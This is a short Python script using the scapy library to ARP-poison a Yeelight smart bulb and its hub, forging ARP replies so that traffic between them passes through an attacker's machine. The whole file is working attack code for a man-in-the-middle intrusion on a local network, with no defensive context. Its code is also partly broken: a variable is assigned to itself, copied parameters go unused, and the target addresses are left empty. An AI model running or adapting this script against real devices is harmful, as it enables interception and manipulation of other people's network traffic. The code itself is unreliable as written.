from scapy.all import *

macAttacker = get_if_hwaddr(conf.iface) #"10:4a:7d:53:88:ba"
ipAttacker = get_if_addr(conf.iface)

macYeelight = "" #78:11:dc:aa:53:32
ipYeelight = ""

macHub = "" #78:11:dc:aa:53:32
ipHub = ""

def poison_yeelight(_ipYeelight, _macYeelight):
    ipYeelight = _ipYeelight
    macYeelight = macYeelight
    arp = Ether() / ARP()
    arp[Ether].src = macAttacker
    arp[ARP].hwsrc = macAttacker
    arp[ARP].psrc = ipHub
    arp[ARP].hwdst = macYeelight
    arp[ARP].pdst = ipYeelight

    sendp(arp, inter = 1, count=-1, iface=conf.iface)

def poison_hub(_hubIP, _hubMAC):
    hubIP = _hubIP
    hubMAC = _hubMAC
    arp = Ether() / ARP()
    arp[Ether].src = macAttacker
    arp[ARP].hwsrc = macAttacker
    arp[ARP].psrc = ipYeelight
    arp[ARP].hwdst = macHub
    arp[ARP].pdst = ipHub

    sendp(arp, inter = 1, count=-1, iface=conf.iface)
